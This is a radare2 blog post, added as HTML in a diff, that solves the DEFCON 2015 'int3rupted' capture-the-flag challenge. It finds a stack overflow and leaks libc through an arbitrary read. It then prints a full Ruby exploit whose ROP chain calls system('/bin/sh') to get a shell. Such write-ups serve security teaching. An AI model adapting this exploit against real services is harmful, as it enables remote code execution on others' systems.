@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en-us">
+	<head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="The radare team">
+<meta name="description" content="The blog of radare2">
+<meta name="generator" content="Hugo 0.74.3" />
+<title>Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2</title>
+<link rel="shortcut icon" href="https://radareorg.github.io/blog/images/favicon.ico">
+<link rel="stylesheet" href="https://radareorg.github.io/blog/css/style.css">
+<link rel="stylesheet" href="https://radareorg.github.io/blog/css/highlight.css">
+
+
+
+<link rel="stylesheet" href="https://radareorg.github.io/blog/css/monosocialiconsfont.css">
+
+
+
+<link href="https://radareorg.github.io/blog/index.xml" rel="alternate" type="application/rss+xml" title="The Official Radare Blog" />
+
+
+<meta property="og:title" content="Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2" />
+<meta property="og:description" content="In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the DEFCON 2015 qualifiers!
+You can find the binary here if you want to play along at home.
+To start with, in the challenge, we were just given a hostname and ip address, no binary was given!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://radareorg.github.io/blog/posts/solving-int3rupted-from-defcon-2015-qualifier-with-r2/" />
+<meta property="article:published_time" content="2015-06-04T21:43:59+02:00" />
+<meta property="article:modified_time" content="2015-06-04T21:43:59+02:00" />
+
+
+<meta itemprop="name" content="Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2">
+<meta itemprop="description" content="In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the DEFCON 2015 qualifiers!
+You can find the binary here if you want to play along at home.
+To start with, in the challenge, we were just given a hostname and ip address, no binary was given!">
+<meta itemprop="datePublished" content="2015-06-04T21:43:59+02:00" />
+<meta itemprop="dateModified" content="2015-06-04T21:43:59+02:00" />
+<meta itemprop="wordCount" content="965">
+
+
+
+<meta itemprop="keywords" content="" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2"/>
+<meta name="twitter:description" content="In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the DEFCON 2015 qualifiers!
+You can find the binary here if you want to play along at home.
+To start with, in the challenge, we were just given a hostname and ip address, no binary was given!"/>
+
+
+    </head>
+<body>
+    <nav class="main-nav">
+	
+		<a href='https://radareorg.github.io/blog'> <span class="arrow">←</span>Home</a>
+	
+
+	
+
+	
+		<a class="cta" href="https://radareorg.github.io/blog/index.xml">Subscribe</a>
+	
+</nav>
+
+    <section id="wrapper">
+        
+        
+<article class="post">
+    <header>
+        <h1>Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2</h1>
+        <h2 class="subtitle"></h2>
+        <h2 class="headline">
+        June 4, 2015
+        <br>
+        
+        </h2>
+    </header>
+    <section id="post-body">
+        <p>In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the <a href="https://legitbs.net/">DEFCON 2015 qualifiers</a>!</p>
+<p>You can find the binary <a href="https://github.com/ctfs/write-ups-2015/blob/master/defcon-qualifier-ctf-2015/pwnable/int3rupted/int3rupted_3bb8f10793b82841c44a366eb9f27223">here</a> if you want to play along at home.</p>
+<p>To start with, in the challenge, we were just given a hostname and ip address, no binary was given! To simulate this, we can use <code>rarun2</code> to host the binary locally. The following line will run the binary on port 8888 on connections:</p>
+<pre><code>rarun2 program=./int3rupted_3bb8f10793b82841c44a366eb9f27223 listen=8888
+</code></pre><p>So, let&rsquo;s try connection with <code>nc</code> to try to interact. After some spamming every character, we discover that if you type in <code>?</code> a help message is displayed.</p>
+<pre><code>impactsite ~/int3 » nc localhost 8888
+&gt; ?
+Help menu:
+        g - Begin execution
+        db &lt;addr&gt; - Dump bytes at addr
+        bp addr - Set breakpoint at addr
+        c - Continue from breakpoint.
+        ? - This text
+&gt;
+</code></pre><p>So, now the name <code>int3rupted</code> makes sense! The <code>int3</code> instruction is defined for use by debuggers to temporarily replace an instruction in a running program in order to set a breakpoint.</p>
+<p>Because this is the binary is not provided, it&rsquo;s going to take some work to find the bug! As we have arbitrary read with <code>db &lt;addr&gt;</code> it will just take a bit of work to find the bug.</p>
+<p>Checking through the loader script on Linux, amd64, we can see that the elf gets loaded at address <code>0x400000</code>, so you can start dumping from there.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">impactsite ~ » cat /usr/lib/ldscripts/elf_x86_64.x | grep SEGMENT_START
+  PROVIDE <span style="color:#f92672">(</span>__executable_start <span style="color:#f92672">=</span> SEGMENT_START<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;text-segment&#34;</span>, 0x400000<span style="color:#f92672">))</span>; . <span style="color:#f92672">=</span> SEGMENT_START<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;text-segment&#34;</span>, 0x400000<span style="color:#f92672">)</span> + SIZEOF_HEADERS;
+  . <span style="color:#f92672">=</span> SEGMENT_START<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ldata-segment&#34;</span>, .<span style="color:#f92672">)</span>;
+</code></pre></div><p><img src="/blog/images/elf_header.png" alt="header"></p>
+<p>Although it is a tedious process, you can dump the enough of the binary to load it up in your favorite disassembler.</p>
+<p>So, quickly after reversing (which I will leave as an exercise to the reader), a high level overview of the binary is as follows.</p>
+<ul>
+<li><code>g</code> goes to chance game</li>
+<li>high score lets you write your name into <em>.bss area</em></li>
+<li><code>db</code> dump bytes - we used to dump bin</li>
+<li><code>bp</code> sets breakpoint, write <code>0xCC</code> mark page as <code>R-X</code> (not <code>W</code>!) can’t do this to stack, b/c becomes unwritable :(</li>
+<li><code>c</code> restore from breakpoint</li>
+<li><code>?</code> print help text</li>
+</ul>
+<p>Let&rsquo;s look at how int3rupted reads in the user&rsquo;s input. The function takes in a length, a fd to read from, a buffer to write to, and a &ldquo;stop&rdquo; character (newline).</p>
+<p><img src="/blog/images/disasm.png" alt="read_user_input"></p>
+<p>Oh, what&rsquo;s this?!? The &ldquo;length&rdquo; var is increased, but it&rsquo;s termination value is at <code>length == 0</code>. This means we have an <em>unchecked</em> read.</p>
+<p>Let&rsquo;s have a look at who else calls the <code>read_user_input</code> function.</p>
+<p><img src="/blog/images/pd2.png" alt="xrefs"></p>
+<p>Can it really be so simple, just a basic stack smash from <code>main_menu</code>? There is no <code>system</code> called in the binary, and there is <em>ASLR</em> activated, but if you recall, we have an arbitrary read, so we can just leak the addresses of libc functions, simple! There isn&rsquo;t even a stack canary to worry about.</p>
+<p>Let&rsquo;s use <code>rabin2</code> to find the address to read in order to leak the libc function <code>puts</code>.</p>
+<p><img src="/blog/images/rabin.png" alt="puts"></p>
+<p>Let&rsquo;s just assume that it&rsquo;s on Ubuntu trusty, because all of the other challenges were. Otherwise there are some nice <a href="https://github.com/niklasb/libc-database">database tools</a> to use.</p>
+<p>So, from here, there is not much left to do. Just construct an exploit that does the following:</p>
+<ul>
+<li>leak libc address of puts</li>
+<li>compute offset of <code>/bin/sh\x00</code> and <code>system</code></li>
+<li><code>pop /bin/sh\x00</code> into <code>rdi</code></li>
+<li>call <code>system</code></li>
+</ul>
+<p>Simple, right?</p>
+<p>And like magic, we can get a shell! 5 easy points. The final exploit below has comments for the r2 commands to get the needed values (like rop gadgets and offsets).
+<img src="/blog/images/shell.png" alt="shell"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#75715e">#!/usr/bin/env ruby</span>
+require_relative <span style="color:#e6db74">&#39;shoe&#39;</span>
+
+<span style="color:#75715e"># host = &#34;int3rupted_3bb8f10793b82841c44a366eb9f27223.quals.shallweplayaga.me&#34;</span>
+<span style="color:#75715e"># port = 52428</span>
+
+<span style="color:#75715e"># rarun2 program=./int3rupted_3bb8f10793b82841c44a366eb9f27223 listen=8888</span>
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>
+
+<span style="color:#75715e"># ubuntu trusty libc</span>
+system_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00046640</span> <span style="color:#75715e"># is~name=system - from libc</span>
+binsh_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0017ccdb</span> <span style="color:#75715e"># / /bin/sh\x00 - from libc</span>
+puts_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0006fe30</span> <span style="color:#75715e"># is~name=puts - from libc</span>
+exit_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0003c290</span> <span style="color:#75715e"># is~name=exit - from libc</span>
+<span style="color:#75715e"># from int3rupted binary</span>
+poprdirbpret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00401648</span> <span style="color:#75715e"># &#34;/R/ pop rdi;ret&#34;</span>
+puts_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00603028</span> <span style="color:#75715e"># iR~puts</span>
+
+@s <span style="color:#f92672">=</span> <span style="color:#66d9ef">Shoe</span><span style="color:#f92672">.</span>new host, port
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_menu</span>
+  @s<span style="color:#f92672">.</span>read_til_end <span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>
+<span style="color:#66d9ef">end</span>
+
+@s<span style="color:#f92672">.</span>say <span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+read_menu
+puts <span style="color:#e6db74">&#34;[!] dumping GOT address of puts&#34;</span>
+@s<span style="color:#f92672">.</span>say <span style="color:#e6db74">&#34;db 0x</span><span style="color:#e6db74">#{</span>puts_got<span style="color:#f92672">.</span>to_s <span style="color:#ae81ff">16</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+str <span style="color:#f92672">=</span> read_menu
+puts str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;&gt;&#34;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">]</span>
+libc_base_addr <span style="color:#f92672">=</span> (str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;-&#34;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">].</span>split(<span style="color:#e6db74">&#34;:&#34;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span>reverse<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>)<span style="color:#f92672">.</span>map{<span style="color:#f92672">|</span>i<span style="color:#f92672">|</span> i<span style="color:#f92672">.</span>reverse}<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>to_i <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> puts_offset
+puts <span style="color:#e6db74">&#34;[+] libc base is at 0x</span><span style="color:#e6db74">#{</span>libc_base_addr<span style="color:#f92672">.</span>to_s <span style="color:#ae81ff">16</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+puts <span style="color:#e6db74">&#34;[+] system is at 0x</span><span style="color:#e6db74">#{</span>(libc_base_addr <span style="color:#f92672">+</span> system_offset)<span style="color:#f92672">.</span>to_s <span style="color:#ae81ff">16</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+puts <span style="color:#e6db74">&#34;[+] /bin/sh</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x00 is at 0x</span><span style="color:#e6db74">#{</span>(libc_base_addr <span style="color:#f92672">+</span> binsh_offset)<span style="color:#f92672">.</span>to_s <span style="color:#ae81ff">16</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+@s<span style="color:#f92672">.</span>say (<span style="color:#e6db74">&#34;g</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+read_menu
+rop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span>
+rop <span style="color:#f92672">&lt;&lt;</span> <span style="color:#f92672">[</span>poprdirbpret<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>) <span style="color:#75715e"># get /bin/sh into rdi</span>
+rop <span style="color:#f92672">&lt;&lt;</span> <span style="color:#f92672">[</span>libc_base_addr <span style="color:#f92672">+</span> binsh_offset<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>) <span style="color:#75715e"># /bin/sh into rdi</span>
+rop <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;JUNKJUNK&#34;</span> <span style="color:#75715e"># garbage popped into rbp</span>
+rop <span style="color:#f92672">&lt;&lt;</span> <span style="color:#f92672">[</span>libc_base_addr <span style="color:#f92672">+</span> system_offset<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>) <span style="color:#75715e"># system(&#34;/bin/sh&#34;)</span>
+rop <span style="color:#f92672">&lt;&lt;</span> <span style="color:#f92672">[</span>libc_base_addr <span style="color:#f92672">+</span> exit_offset<span style="color:#f92672">].</span>pack(<span style="color:#e6db74">&#34;Q&#34;</span>) <span style="color:#75715e"># exit cleanly :)</span>
+puts <span style="color:#e6db74">&#34;[!] sending rop chain!&#34;</span>
+@s<span style="color:#f92672">.</span>say <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>rop<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+str <span style="color:#f92672">=</span> read_menu
+puts <span style="color:#e6db74">&#34;[*] enjoy your shell&#34;</span>
+@s<span style="color:#f92672">.</span>tie!
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;socket&#39;</span>
+require <span style="color:#e6db74">&#39;timeout&#39;</span>
+require <span style="color:#e6db74">&#39;rolling_timeout&#39;</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Shoe</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">TCPSocket</span>
+  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_until</span> str
+    buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">until</span> buf<span style="color:#f92672">.</span>end_with? str <span style="color:#66d9ef">do</span>
+      buf <span style="color:#f92672">&lt;&lt;</span> self<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">end</span>
+    buf
+  <span style="color:#66d9ef">end</span>
+
+  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recv_until_re</span> regex
+    buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> regex<span style="color:#f92672">.</span>match buf
+      buf <span style="color:#f92672">&lt;&lt;</span> self<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">end</span>
+    buf
+  <span style="color:#66d9ef">end</span>
+
+  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">say</span> str
+    self<span style="color:#f92672">.</span>send str, <span style="color:#ae81ff">0</span>
+  <span style="color:#66d9ef">end</span>
+
+  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_n_seconds</span> secs
+    <span style="color:#75715e"># requires native threads.</span>
+    <span style="color:#75715e"># doesn&#39;t work with ruby 1.8.x or lower</span>
+    buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">begin</span>
+      timeout(secs) <span style="color:#66d9ef">do</span>
+        <span style="color:#66d9ef">loop</span> {
+          buf <span style="color:#f92672">&lt;&lt;</span> self<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>)
+        }
+      <span style="color:#66d9ef">end</span>
+    <span style="color:#66d9ef">rescue</span> <span style="color:#66d9ef">Timeout</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Error</span>
+    <span style="color:#66d9ef">end</span>
+    buf
+  <span style="color:#66d9ef">end</span>
+
+  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_til_end</span> timeout
+    <span style="color:#75715e"># timeout is time between chars</span>
+    buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">begin</span>
+      <span style="color:#66d9ef">RollingTimeout</span><span style="color:#f92672">.</span>new(timeout) { <span style="color:#f92672">|</span>timer<span style="color:#f92672">|</span>
+        <span style="color:#66d9ef">loop</span> {
+          buf <span style="color:#f92672">&lt;&lt;</span> self<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>)
+          timer<span style="color:#f92672">.</span>reset
+        }
+      }
+    <span style="color:#66d9ef">rescue</span> <span style="color:#66d9ef">Timeout</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Error</span>
+    <span style="color:#66d9ef">end</span>
+    buf
+  <span style="color:#66d9ef">end</span>
+
+  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tie!</span>
+    <span style="color:#75715e"># kick off a thread just reading forever</span>
+    <span style="color:#66d9ef">Thread</span><span style="color:#f92672">.</span>new { <span style="color:#66d9ef">loop</span> { $stdout<span style="color:#f92672">.</span>write(self<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)) } }
+    str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">loop</span> {
+      ch <span style="color:#f92672">=</span> $stdin<span style="color:#f92672">.</span>read_nonblock(<span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">rescue</span> <span style="color:#66d9ef">nil</span>
+      <span style="color:#66d9ef">if</span> ch <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span>
+        <span style="color:#66d9ef">next</span>
+      <span style="color:#66d9ef">end</span>
+      self<span style="color:#f92672">.</span>send ch, <span style="color:#ae81ff">0</span>
+    }
+  <span style="color:#66d9ef">end</span>
+<span style="color:#66d9ef">end</span>
+</code></pre></div>
+    </section>
+</article>
+
+<footer id="post-meta" class="clearfix">
+    <a href="https://twitter.com/radareorg">
+    <img class="avatar" src="https://radareorg.github.io/blog/images/avatar.png">
+    <div>
+        <span class="dark">The radare team</span>
+        <span></span>
+    </div>
+    </a>
+    <section id="sharing">
+        <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fradareorg.github.io%2fblog%2fposts%2fsolving-int3rupted-from-defcon-2015-qualifier-with-r2%2f - Solving%20%27int3rupted%27%20from%20defcon%202015%20qualifier%20with%20r2 by @radareorg"><span class="icon-twitter"> https://twitter.com/radareorg</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+    </section>
+</footer>
+
+
+
+<ul id="post-list" class="archive readmore">
+    <h3>Read more</h3>
+
+    
+    
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/sleigh_disassembler_backend/">GSoC 2020: SLEIGH Disassembler Backend<aside class="dates">Sep 6 2020</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/rsoc-2019-console-interface-improvement/">RSoC 2019 Final: Console Interface Improvements<aside class="dates">Oct 1 2019</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/rsoc-2019-selection/">Radare2 Summer of Code 2019 Selection Results<aside class="dates">Apr 2 2019</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/radare2-survey/">Radare2 Community Survey Results<aside class="dates">Feb 2 2019</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/radare2-bioinformatics/">Radare2 and bioinformatics: a good match?<aside class="dates">Aug 31 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/cutter_debug/">GSoC 2018 Final: Debugging and Emulation Support for Cutter<aside class="dates">Aug 20 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/cli_improvements/">GSoC 2018 Final: Console Interface Improvementes<aside class="dates">Aug 19 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/gsoc_2018_radeco_cfs/">GSoC 2018: Control Flow Structuring for Radeco-lib<aside class="dates">Aug 12 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/gsoc_2018_radeco_pseudo_c_code_generation/">Gsoc 2018 Radeco Pseudo C Code Generation<aside class="dates">Aug 12 2018</aside></a>
+        </li>
+    
+        <li>
+            <a href="https://radareorg.github.io/blog/posts/type_inference/">GSoC&#39;18 Final: Type inference<aside class="dates">Aug 12 2018</aside></a>
+        </li>
+    
+</ul>
+
+
+
+        <footer id="footer">
+    
+    <p class="small">
+    
+        The radare team
+    
+    </p>
+</footer>
+
+    </section>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://radareorg.github.io/blog/js/main.js"></script>
+<script src="https://radareorg.github.io/blog/js/highlight.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+</body>
+</html>
